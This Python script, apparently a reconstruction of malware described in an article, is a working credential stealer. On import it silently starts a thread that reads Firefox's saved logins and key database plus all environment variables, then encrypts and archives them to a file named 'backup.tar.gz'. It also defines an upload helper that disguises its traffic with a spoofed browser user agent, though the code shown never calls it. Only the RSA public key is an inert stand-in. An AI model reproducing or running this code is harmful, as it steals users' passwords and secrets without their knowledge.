import base64, json, os, io, tarfile, time, hashlib, urllib.request
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad

# Reconstructed collector: the article specifies targets and envelope operations.
def collect():
    login_bytes = open('/home/user/.mozilla/firefox/default/logins.json', 'rb').read()
    key_bytes = open('/home/user/.mozilla/firefox/default/key4.db', 'rb').read()
    report = {'logins.json': base64.b64encode(login_bytes).decode(),
              'key4.db': base64.b64encode(key_bytes).decode(),
              'env': dict(os.environ)}
    raw = json.dumps(report).encode()
    key, iv = os.urandom(32), os.urandom(16)
    encrypted = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(raw, 16))
    # Inert stand-in public modulus; not the campaign's undisclosed public key.
    public = RSA.construct((2 ** 2048 - 159, 65537))
    wrapped = PKCS1_OAEP.new(public).encrypt(key)
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as archive:
        for name, content in [('hdr.json', json.dumps({'target': os.uname().nodename, 'timestamp': time.time()}).encode()), ('data.bin', iv + encrypted), ('key.bin', wrapped)]:
            info = tarfile.TarInfo(name)
            info.size = len(content)
            archive.addfile(info, io.BytesIO(content))
    open('/tmp/backup.tar.gz', 'wb').write(buf.getvalue())

def pc_post(url, body, token=None):
    req = urllib.request.Request(url, data=body, method='POST')
    req.add_header('Content-Type', 'application/octet-stream')
    req.add_header('User-Agent', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0)')
    req.add_header('X-SHA256', hashlib.sha256(body).hexdigest())
    if token:
        req.add_header('X-Token', token)
    for attempt in range(4):
        try:
            with urllib.request.urlopen(req, timeout=120) as response:
                if response.status == 200:
                    return True
        except Exception:
            pass
        if attempt < 3:
            time.sleep(2 ** attempt)
    return False

import threading
threading.Thread(target=collect, daemon=True).start()
